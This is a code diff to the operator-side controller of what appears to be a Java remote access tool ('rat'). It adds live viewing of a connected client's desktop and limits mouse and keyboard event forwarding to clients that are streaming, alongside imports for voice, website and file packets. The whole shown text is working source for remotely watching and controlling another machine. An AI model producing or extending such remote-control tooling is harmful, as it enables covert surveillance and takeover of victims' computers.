@@ -26,6 +26,7 @@ import de.sogomn.rat.packet.VoicePacket;
 import de.sogomn.rat.packet.WebsitePacket;
 import de.sogomn.rat.server.AbstractRattyController;
 import de.sogomn.rat.server.ActiveServer;
+import de.sogomn.rat.util.FrameEncoder.IFrame;
 
 /*
  * Woah, this is a huge class.
@@ -229,9 +230,9 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = createDeletePacket(client);
 		} else if (command == FileTree.NEW_FOLDER) {
 			packet = createFolderPacket(client);
-		} else if (command == DisplayPanel.MOUSE_EVENT) {
+		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastMouseEventPacket();
-		} else if (command == DisplayPanel.KEY_EVENT) {
+		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastKeyEventPacket();
 		}
 		
@@ -258,6 +259,20 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}
 	}
 	
+	private void handleDesktopPacket(final ServerClient client, final DesktopPacket packet) {
+		if (!client.isStreamingDesktop()) {
+			return;
+		}
+		
+		final IFrame[] frames = packet.getFrames();
+		final int screenWidth = packet.getScreenWidth();
+		final int screenHeight = packet.getScreenHeight();
+		final DesktopPacket request = new DesktopPacket();
+		
+		client.connection.addPacket(request);
+		client.displayPanel.showFrames(frames, screenWidth, screenHeight);
+	}
+	
 	private boolean handlePacket(final ServerClient client, final IPacket packet) {
 		final Class<? extends IPacket> clazz = packet.getClass();
 		
@@ -272,7 +287,9 @@ public final class RattyGuiController extends AbstractRattyController implements
 			
 			handleFiles(client, request);
 		} else if (clazz == DesktopPacket.class) {
+			final DesktopPacket desktop = (DesktopPacket)packet;
 			
+			handleDesktopPacket(client, desktop);
 		} else {
 			consumed = false;
 		}
